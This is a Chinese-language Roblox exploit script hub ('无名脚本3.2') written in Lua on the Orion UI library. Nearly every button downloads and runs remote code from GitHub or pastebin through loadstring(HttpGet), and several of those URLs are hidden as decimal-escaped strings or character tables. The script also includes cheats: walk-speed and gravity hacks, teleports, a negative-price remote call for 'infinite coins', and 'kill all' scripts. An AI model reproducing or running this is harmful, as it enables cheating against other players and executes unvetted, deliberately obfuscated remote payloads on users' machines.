local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
local LBLG = Instance.new("ScreenGui", getParent)
local LBL = Instance.new("TextLabel", getParent)
local player = game.Players.LocalPlayer

LBLG.Name = "LBLG"
LBLG.Parent = game.CoreGui
LBLG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
LBLG.Enabled = true
LBL.Name = "LBL"
LBL.Parent = LBLG
LBL.BackgroundColor3 = Color3.new(1, 1, 1)
LBL.BackgroundTransparency = 1
LBL.BorderColor3 = Color3.new(0, 0, 0)
LBL.Position = UDim2.new(0.75,0,0.010,0)
LBL.Size = UDim2.new(0, 133, 0, 30)
LBL.Font = Enum.Font.GothamSemibold
LBL.Text = "TextLabel"
LBL.TextColor3 = Color3.new(1, 1, 1)
LBL.TextScaled = true
LBL.TextSize = 14
LBL.TextWrapped = true
LBL.Visible = true

local FpsLabel = LBL
local Heartbeat = game:GetService("RunService").Heartbeat
local LastIteration, Start
local FrameUpdateTable = { }

local function HeartbeatUpdate()
	LastIteration = tick()
	for Index = #FrameUpdateTable, 1, -1 do
		FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
	end
	FrameUpdateTable[1] = LastIteration
	local CurrentFPS = (tick() - Start >= 1 and #FrameUpdateTable) or (#FrameUpdateTable / (tick() - Start))
	CurrentFPS = CurrentFPS - CurrentFPS % 1
	FpsLabel.Text = ("北京时间:"..os.date("%H").."时"..os.date("%M").."分"..os.date("%S"))
end
Start = tick()
Heartbeat:Connect(HeartbeatUpdate)
local Window = OrionLib:MakeWindow({Name = "无名脚本3.2", HidePremium = false, SaveConfig = true,IntroText = "无名脚本3.2", ConfigFolder = "无名脚本3.2"})

game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "无名脚本3.2"; Text ="无名脚本3.2"; Duration = 4; })

local about = Window:MakeTab({
    Name = "简介",
    Icon = "rbxassetid://7734068321",
    PremiumOnly = false

})

about:AddParagraph("作者无名~2736691058")
about:AddParagraph("328466920dhvkgbhic无名🤓~")
about:AddParagraph("作者无名喵~2736691058")
about:AddParagraph("缝合脚本集")

local Tab =Window:MakeTab({

	Name = "作者QQ在这里",

	Icon = "rbxassetid://2736691058",

	PremiumOnly = false

})

Tab:AddButton({

	Name = "复制作者QQ",

	Callback = function()

     setclipboard("2736691058")

  	end

})

Tab:AddButton({

	Name = "复制QQ群",

	Callback = function()

     setclipboard("1014094149")

  	end

})

OrionLib:MakeNotification({
	Name = "无名🤓~",
	Content = "欢迎使用免费脚本",
	Image = "rbxassetid://7734068321",
	Time = 2

})

local Tab = Window:MakeTab({

    Name = "通用",

    Icon = "rbxassetid://7734068321",

    PremiumOnly = false

})

local Section = Tab:AddSection({

	Name = "无名~🤓创作"

})

Tab:AddSlider({

	Name = "速度",

	Min = 16,

	Max = 200,

	Default = 16,

	Color = Color3.fromRGB(255,255,255),

	Increment = 1,

	ValueName = "数值",

	Callback = function(Value)

		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value

	end    

})

Tab:AddSlider({

	Name = "跳跃高度",

	Min = 50,

	Max = 200,

	Default = 50,

	Color = Color3.fromRGB(255,255,255),

	Increment = 1,

	ValueName = "数值",

	Callback = function(Value)

		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value

	end    

})

Tab:AddTextbox({

	Name = "跳跃高度设置",

	Default = "",

	TextDisappear = true,

	Callback = function(Value)

		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value

	end

})

Tab:AddTextbox({

	Name = "移动速度设置",

	Default = "",

	TextDisappear = true,

	Callback = function(Value)

		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value

	end

})

Tab:AddTextbox({

	Name = "重力设置",

	Default = "",

	TextDisappear = true,

	Callback = function(Value)

		game.Workspace.Gravity = Value

	end

})

Tab:AddToggle({

	Name = "夜视",

	Default = false,

	Callback = function(Value)

		if Value then

		    game.Lighting.Ambient = Color3.new(1, 1, 1)

		else

		    game.Lighting.Ambient = Color3.new(0, 0, 0)

		end

	end

})

Tab:AddButton({

	Name = "飞行V3（隐藏）",

	Callback = function()

loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\90\66\122\99\84\109\49\102\34\41\41\40\41\10")()

  	end    

})

Tab:AddButton({

	Name = "替身",

	Callback = function()

loadstring(game:HttpGet(('https://raw.githubusercontent.com/SkrillexMe/SkrillexLoader/main/SkrillexLoadMain')))()

    end

})
local Tab = Window:MakeTab({
    Name = "秘密邻居",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
    Name = "功能1",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsMe/ToraIsMe/main/0secret"))()
	end
})

Tab:AddButton({
    Name = "无限金币(FE)",
	Callback = function()
	--Coupons
local args = {
[1] = -999999,
[2] = {
["Scout"] = {},
["Butcher"] = {},
["Bagger"] = {},
["Brave"] = {},
["Detective"] = {},
["Engineer"] = {},
["Scary"] = {},
["Custom"] = {},
["Clown"] = {},
["Leader"] = {
["A_Leader_Advanced_01_LEGS"] = "A_Leader_Advanced_01_LEGS"
}
},
[3] = "A_Leader_Advanced_01_LEGS",
[4] = "Leader",
[5] = "Coupons"
}

game:GetService("ReplicatedStorage").RemoteFunctions.BuyItemFunction:InvokeServer(unpack(args))
--Coins
local args = {
[1] = -999999,
[2] = {
["Scout"] = {},
["Butcher"] = {},
["Bagger"] = {},
["Brave"] = {},
["Detective"] = {},
["Engineer"] = {},
["Scary"] = {},
["Custom"] = {},
["Clown"] = {},
["Leader"] = {
["A_Leader_Advanced_01_LEGS"] = "A_Leader_Advanced_01_LEGS"
}
},
[3] = "A_Leader_Advanced_01_LEGS",
[4] = "Leader",
[5] = "Coins"
}
game:GetService("ReplicatedStorage").RemoteFunctions.BuyItemFunction:InvokeServer(unpack(args))
    end
})

local Tab = Window:MakeTab({
	Name = "特殊脚本",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
	Name = "模仿者脚本",
	Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ttjy9808/THEMIMICNEWMOBILEUINOTBETA/main/README.md"))()
	end    
})

Tab:AddButton({
	Name = "画质脚本",
	Callback = function()
	 loadstring(game:HttpGet(('https://pastefy.app/xXkUxA0P/raw'),true))()
  	end    
})

Tab:AddButton({
	Name = "FE动作",
	Callback = function()
     loadstring(game:HttpGet(('https://pastebin.com/raw/1p6xnBNf'),true))()
  	end    
})

Tab:AddButton({
	Name = "走路甩人",
	Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
  	end    
})

Tab:AddButton({
	Name = "NA管理员",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
	end
})

Tab:AddButton({
    Name="电脑键盘",
    Callback=function()
    loadstring(game:HttpGet("https://pastebin.com/raw/xSsDaMg2"))()
    end
})

Tab:AddButton({
    Name="FE幽灵中心",
    Callback=function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
    end
})
local Tab = Window:MakeTab({
	Name = "游戏脚本(会陆续更新)",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
	Name = "伐木大亨",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/CloudX-ScriptsWane/ScriptsDache/main/%E4%BC%90%E6%9C%A8%E5%A4%A7%E4%BA%A822.lua", true))()
	end
})

Tab:AddButton({
	Name = "自然灾害模拟器",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/BidoSkinsYT/BidoSkinsYT/main/Bido%20SkinsV1.5"))()
	end
})

Tab:AddButton({
	Name = "彩虹朋友",
	Callback = function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/ToraIsMe/ToraIsMe/main/0rainbow'))()
	end
})

Tab:AddButton({
	Name = "脚本中心1.5",
	Callback = function()
	loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\103\101\109\120\72\119\65\49"))()
	end
})

Tab:AddButton({
	Name = "脚本中心",
	Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/De4aYHDY"))()
  	end
})

Tab:AddButton({
	Name = "极速传奇",
	Callback = function()		loadstring(game:HttpGet('\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\98\111\121\115\99\112\47\98\101\116\97\47\109\97\105\110\47\37\69\57\37\56\48\37\57\70\37\69\53\37\66\65\37\65\54\37\69\55\37\56\50\37\66\56\37\69\56\37\66\53\37\66\55\46\108\117\97'))()
    end
})

local Tab = Window:MakeTab({
    Name = "监狱人生",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
	Name = "猛虎管理员",
	Callback = function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/h17s3/TIGERADMIN/main/TIGERADMINSCRIPTFREE'),true))()
	end
})

Tab:AddButton({
    Name = "多功能菜单",
	Callback = function()
	loadstring(game:HttpGet('https://paste.website/p/96d68817-3f1e-4fef-a8b8-9aafdc810329.txt'))()
	end
})

Tab:AddButton({
    Name = "罗亚天1.5 ",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Denverrz/scripts/master/PRISONWARE_v1.3.txt"))();
	end
})

Tab:AddButton({
	Name = "变车模型",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/PSXhuge/1/114514/bianche"))()
  	end
})
Tab:AddButton({
	Name = "变死神（有惊喜仅自己可见）",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/PSXhuge/1/114514/sb"))()    
  	end
})
Tab:AddButton({
	Name = "变钢铁侠（有惊喜别人能看见）",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/PSXhuge/1/114514/sb2"))()
  	end
})
Tab:AddButton({
	Name = "手里剑（秒杀）",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/PSXhuge/1/114514/jian"))()
  	end
})
Tab:AddButton({
	Name = "杀死全部（新版重复杀）",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/PSXhuge/1/114514/shasi"))()
  	end
})
Tab:AddButton({
	Name = "无敌模式（别人可见）",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/PSXhuge/1/114514/wudi"))()
  	end
})
local Section = Tab:AddSection({
	Name = "传送位置"
})
Tab:AddButton({
	Name = "警卫室",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(847.7261352539062, 98.95999908447266, 2267.387451171875)
  	end
})
Tab:AddButton({
	Name = "监狱室内",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(919.2575073242188, 98.95999908447266, 2379.74169921875)
  	end
})
Tab:AddButton({
	Name = "罪犯复活点",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-937.5891723632812, 93.09876251220703, 2063.031982421875)
  	end
})
Tab:AddButton({
	Name = "监狱室外",
	Callback = function()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(760.6033325195312, 96.96992492675781, 2475.405029296875)
  	end
})
local Tab = Window:MakeTab({
    Name = "doors",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
    Name = "MSDOORS",
	Callback = function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/mstudio45/MSDOORS/7bd97c2d956a775d683c2d7973d79715b30998ea/MSDOORS/Moonsec.lua'))()
	end
})

Tab:AddButton({
    Name = "国王脚本",
	Callback = function()
	loadstring(game:HttpGet(('https://pastebin.com/raw/R8QMbhzv')))()
	end
})

Tab:AddButton({
	Name = "穿墙(无拉回)",
	Callback = function()
loadstring(game:HttpGet("https://github.com/DXuwu/OK/raw/main/clip"))()
    end
})
Tab:AddButton({
	Name = "手电筒（没电会有bug）",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/K0t1n/Public/main/Normal%20Flashlight"))()
    end
}) 
Tab:AddButton({
	Name = "神圣炸弹（清岩提供）",
    Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MrNeRD0/Doors-Hack/main/HolyGrenadeByNerd.lua"))()
    end
})
Tab:AddButton({
	Name = "十字架",
    Callback = function()
loadstring(game:HttpGet('https://gist.githubusercontent.com/C00LBOZO/0c78ad8c74ca26324c87ede16ce8b387/raw/c0887ac0d24fde80bea11ab1a6a696ec296af272/Crucifix'))()
    end
})
Tab:AddButton({
	Name = "变身(阿巴怪提供)",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ChronoAccelerator/Public-Scripts/main/Morphing/MorphScript.lua"))();
    end
})
Tab:AddButton({
	Name = "微山2.3.2(依旧是阿巴怪提供)",
	Callback = function()
--微山doors 2.3.2(愚人节快乐)
loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\117\72\72\112\56\102\122\83"))()
    end
})

local Tab = Window:MakeTab({
    Name = "脚本合集",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})

Tab:AddButton({
    Name = "USA脚本卡密:USA AER",
	Callback = function()
	getgenv().USA="作者莫羽免费请勿倒卖"loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/beta/main/USA.lua"))()
	end
})

Tab:AddButton({
    Name = "龙脚本",
	Callback = function()
	getgenv().long = "龙脚本，加载时间长请耐心"loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\108\121\121\97\105\110\105\47\108\111\110\47\109\97\105\110\47\108\105\115\119\109\34\41\41\40\41")()
	end
})

Tab:AddButton({
    Name = "陈脚本",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/MarkCX3/Mark/main/%E6%98%AF%E9%99%88"))()
	end
})

Tab:AddButton({
    Name = "白灰脚本",
	Callback = function()
	_G.Clouduilib = "白灰脚作者小云，加载出十几秒"loadstring(game:HttpGet("https://raw.githubusercontent.com/CloudX-ScriptsWane/White-ash-script/main/%E7%99%BD%E7%81%B0%E8%84%9A%E6%9C%ACbeta.lua", true))()
	end
})
Tab:AddButton({
	Name = "自制脚本",
	Callback = function()
  getgenv().yczgqffg="自制脚本" loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,122,110,67,121,54,89,77,81})end)())))()
  	end
})
 
Tab:AddButton({
	Name = "eom脚本",
	Callback = function()
  getgenv().eom = "eom"
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\68\122\120\115\81\82\68\85\39\41\41\40\41")()
  	end
})
 
Tab:AddButton({
	Name = "河流脚本",
	Callback = function()
  loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\102\106\121\106\99\121\106\72\84\98\102\106\47\82\111\98\108\111\120\47\109\97\105\110\47\37\69\54\37\66\50\37\66\51\37\69\56\37\56\52\37\57\65\37\69\54\37\57\67\37\65\67\37\69\55\37\57\65\37\56\52\37\69\55\37\57\57\37\66\68\37\69\53\37\57\48\37\56\68\37\69\53\37\56\68\37\57\53\46\108\117\97\34\41\41\40\41")()
  	end
})
 
Tab:AddButton({
	Name = "BS脚本卡密:195154ajd",
	Callback = function()
  loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,71,57,103,117,122,88,100,75})end)())))()--BS
  	end
})

Tab:AddButton({
	Name = "脚本中心1.5",
	Callback = function()		loadstring(game:HttpGet('\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\103\101\109\120\72\119\65\49"))()'))()
	end
})

Tab:AddButton({
	Name = "大青蛙脚本密钥gdhfhfuyfcghg545565686565588",
	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/hshjshdj/hshjshdj/main/%E5%A4%A7%E9%9D%92%E8%9B%99%E5%8A%A0%E5%AF%86'))()
  	end
})
local Tab = Window:MakeTab({
	Name = "力量传奇",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})
local Section = Tab:AddSection({
	Name = "力量传奇"
})
Tab:AddButton({
	Name = "传送到出生点",
	Callback = function()
      		      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(7, 3, 108)
  	end    
})
Tab:AddButton({
	Name = "传送到冰霜健身房",
	Callback = function()
      		      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2543, 13, -410)
  	end    
})
Tab:AddButton({
	Name = "传送到神话健身房",
	Callback = function()
      		      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2177, 13, 1070)
  	end    
})
Tab:AddButton({
	Name = "传送到永恒健身房",
	Callback = function()
      		      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-6686, 13, -1284)
  	end    
})
Tab:AddButton({
	Name = "传送到传说健身房",
	Callback = function()
      		      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4676, 997, -3915)
  	end    
})
Tab:AddButton({
	Name = "传送到肌肉之王健身房",
	Callback = function()
      		      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-8554, 22, -5642)
  	end    
})
Tab:AddButton({
	Name = "传送到安全岛",
	Callback = function()
      		      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-39, 10, 1838)
  	end    
})
Tab:AddButton({
	Name = "传送到幸运抽奖区域",
	Callback = function()
      		      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2606, -2, 5753)
  	end    
})
local Tab = Window:MakeTab({
	Name = "超级大力士模拟器",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})
local Section = Tab:AddSection({
	Name = "超级大力士模拟器"
})
Tab:AddButton({
	Name = "传送到开始区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(85.86943817138672, 11.751949310302734, -198.07127380371094)
  	end    
})
Tab:AddButton({
	Name = "传送到健身区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(93.60747528076172, 11.751947402954102, -10.266206741333008)
  	end    
})
Tab:AddButton({
	Name = "传送到食物区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(78.86384582519531, 11.751947402954102, 228.9690399169922)
  	end    
})
Tab:AddButton({
	Name = "传送到街机区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(88.99887084960938, 11.751949310302734, 502.90997314453125)
  	end    
})
Tab:AddButton({
	Name = "传送到农场区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(85.6707763671875, 11.751947402954102, 788.5997314453125)
  	end    
})
Tab:AddButton({
	Name = "传送到城堡区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(84.87281036376953, 11.84177017211914, 1139.7509765625)
  	end    
})
Tab:AddButton({
	Name = "传送到蒸汽朋克区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(92.63227081298828, 11.841767311096191, 1692.7890625)
  	end    
})
Tab:AddButton({
	Name = "传送到迪斯科区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(98.69613647460938, 16.015085220336914, 2505.213134765625)
  	end    
})
Tab:AddButton({
	Name = "传送到太空区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(88.42948150634766, 11.841769218444824, 3425.941650390625)
  	end    
})
Tab:AddButton({
	Name = "传送到糖果区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(63.55805969238281, 11.841663360595703, 4340.69921875)
  	end    
})
Tab:AddButton({
	Name = "传送到实验室区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(78.00920867919922, 11.841663360595703, 5226.60205078125)
  	end    
})
Tab:AddButton({
	Name = "传送到热带区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(80.26090240478516, 12.0902681350708, 6016.16552734375)
  	end    
})
Tab:AddButton({
	Name = "传送到恐龙区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(38.4753303527832, 25.801530838012695, 6937.779296875)
  	end    
})

Tab:AddButton({
	Name = "传送到复古区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99.81867218017578, 12.89099407196045, 7901.74755859375)
  	end    
})

Tab:AddButton({
	Name = "传送到冬季区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(63.47243881225586, 11.841662406921387, 8983.810546875)
  	end    
})
Tab:AddButton({
	Name = "传送到深海区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(105.36250305175781, 26.44820213317871, 9970.0849609375)
  	end    
})
Tab:AddButton({
	Name = "传送到狂野西部区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(68.69414520263672, 15.108586311340332, 10938.654296875)
  	end    
})
Tab:AddButton({
	Name = "传送到豪华公寓区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(86.75145721435547, 11.313281059265137, 12130.349609375)
  	end    
})
Tab:AddButton({
	Name = "传送到宝剑战斗区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(111.25597381591797, 11.408829689025879, 12945.57421875)
  	end    
})
Tab:AddButton({
	Name = "传送到童话区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(121.14932250976562, 11.313281059265137, 14034.50390625)
  	end    
})
Tab:AddButton({
	Name = "传送到桃花区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(108.2142333984375, 11.813281059265137, 15131.861328125)
  	end    
})
Tab:AddButton({
	Name = "传送到厨房区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(135.78338623046875, 21.76291847229004, 16204.9755859375)
  	end    
})
Tab:AddButton({
	Name = "传送到下水道区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(47.36086654663086, 12.25178050994873, 17656.04296875)
  	end    
})
local Tab = Window:MakeTab({
	Name = "忍者传奇",
	Icon = "rbxassetid://7734068321",
	PremiumOnly = false
})
local Section = Tab:AddSection({
	Name = "忍者传奇"
})
Tab:AddButton({
	Name = "传送到出生点",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(25.665502548217773, 3.4228405952453613, 29.919952392578125)
  	end    
})
Tab:AddButton({
	Name = "传送到附魔岛",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(51.17238235473633, 766.1807861328125, -138.44842529296875)
  	end    
})
Tab:AddButton({
	Name = "传送到神秘岛",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(171.97178649902344, 4047.380859375, 42.0699577331543)
  	end    
})
Tab:AddButton({
	Name = "传送到太空岛",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(148.83824157714844, 5657.18505859375, 73.5014877319336)
  	end    
})
Tab:AddButton({
	Name = "传送到冻土岛",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(139.28330993652344, 9285.18359375, 77.36406707763672)
  	end    
})
Tab:AddButton({
	Name = "传送到永恒岛",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(149.34817504882812, 13680.037109375, 73.3861312866211)
  	end    
})
Tab:AddButton({
	Name = "传送到沙暴岛",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(133.37144470214844, 17686.328125, 72.00334167480469)
  	end    
})
Tab:AddButton({
	Name = "传送到雷暴岛",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(143.19349670410156, 24070.021484375, 78.05432891845703)
  	end    
})
Tab:AddButton({
	Name = "传送到远古炼狱岛",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(141.27163696289062, 28256.294921875, 69.3790283203125)
  	end    
})
Tab:AddButton({
	Name = "传送到午夜暗影岛",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(132.74267578125, 33206.98046875, 57.495574951171875)
  	end    
})
Tab:AddButton({
	Name = "传送到神秘灵魂岛",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(137.76148986816406, 39317.5703125, 61.06639862060547)
  	end    
})
Tab:AddButton({
	Name = "传送到冬季奇迹岛",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(137.2720184326172, 46010.5546875, 55.941951751708984)
  	end    
})
Tab:AddButton({
	Name = "传送到黄金大师岛",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(128.32339477539062, 52607.765625, 56.69411849975586)
  	end    
})
Tab:AddButton({
	Name = "传送到龙传奇岛",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(146.35226440429688, 59594.6796875, 77.53300476074219)
  	end    
})
Tab:AddButton({
	Name = "传送到赛博传奇岛",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(137.3321075439453, 66669.1640625, 72.21722412109375)
  	end    
})
Tab:AddButton({
	Name = "传送到天岚超能岛",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(135.48077392578125, 70271.15625, 57.02311325073242)
  	end    
})
Tab:AddButton({
	Name = "传送到混沌传奇岛",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(148.58590698242188, 74442.8515625, 69.3177719116211)
  	end    
})
Tab:AddButton({
	Name = "传送到混沌传奇岛",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(148.58590698242188, 74442.8515625, 69.3177719116211)
  	end    
})
Tab:AddButton({
	Name = "传送到灵魂融合岛",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(136.9700927734375, 79746.984375, 58.54051971435547)
  	end    
})
Tab:AddButton({
	Name = "传送到黑暗元素岛",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(141.697265625, 83198.984375, 72.73107147216797)
  	end    
})
Tab:AddButton({
	Name = "传送到内心和平岛",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(135.3157501220703, 87051.0625, 66.78429412841797)
  	end    
})
Tab:AddButton({
	Name = "传送到炽烈漩涡岛",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(135.08216857910156, 91246.0703125, 69.56692504882812)
  	end    
})
Tab:AddButton({
	Name = "传送到35倍金币区域",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(86.2938232421875, 91245.765625, 120.54232788085938)
  	end    
})
Tab:AddButton({
	Name = "传送到死亡宠物",
	Callback = function()
      		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4593.21337890625, 130.87181091308594, 1430.2239990234375)
  	end    
})
Tab:AddToggle(
    {
        Name = "自动挥舞",
        Default = false,
        Callback = function(x)
            autoswing = x
            if autoswing then
                swinging()
            end
        end
    }
)
Tab:AddToggle(
    {
        Name = "自动售卖",
        Default = false,
        Callback = function(x)
            autosell = x
            if autosell then
                selling()
            end
        end
    }
)
Tab:AddToggle(
    {
        Name = "存满了自动售卖",
        Default = false,
        Callback = function(x)
            autosellmax = x
            if autosellmax then
                maxsell()
            end
        end
    }
)
local Section = Tab:AddSection({
	Name = "自动购买功能"
})
Tab:AddToggle(
    {
        Name = "自动购买剑",
        Default = false,
        Callback = function(x)
            autobuyswords = x
            if autobuyswords then
                buyswords()
            end
        end
    }
)
